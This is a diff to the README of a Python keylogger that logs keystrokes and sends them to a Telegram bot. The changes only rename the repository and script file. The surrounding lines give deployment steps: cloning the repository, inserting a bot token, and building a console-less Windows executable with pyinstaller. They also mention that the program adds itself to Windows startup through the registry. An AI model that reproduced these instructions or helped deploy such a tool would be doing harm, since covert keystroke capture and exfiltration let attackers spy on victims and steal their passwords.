@@ -25,8 +25,8 @@ This is a Python-based keylogger that logs keystrokes and sends them to a Telegr
 🚀 How to Use
 🔹 Step 1: Clone or Download
   ```bash
-git clone https://github.com/YOUR_USERNAME/telegram-keylogger.git
-cd telegram-keylogger
+git clone https://github.com/localhostvicky/window_keylogger.git
+cd window_keylogger
   ```
 🔹 Step 2: Edit Script
 Open the script and replace these values:
@@ -43,13 +43,13 @@ https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
 Run it directly:
 
   ```bash
-python keylogger.py
+python window_keylogger.py
   ```
 
 Or create a Windows EXE file:
   ```bash
 pip install pyinstaller
-pyinstaller --noconsole --onefile keylogger.py
+pyinstaller --noconsole --onefile window_keylogger.py
   ```
 The .exe file will be inside the dist/ folder.
 
@@ -63,8 +63,8 @@ Adds to Windows startup using the registry
 
 📁 File Structure
   ```bash
-telegram-keylogger/
-├── keylogger.py     # Main script
+window_keylogger/
+├──window_keylogger.py     # Main script
 ├── README.md        # Project documentation
   ```
 ⚠️ Legal Note
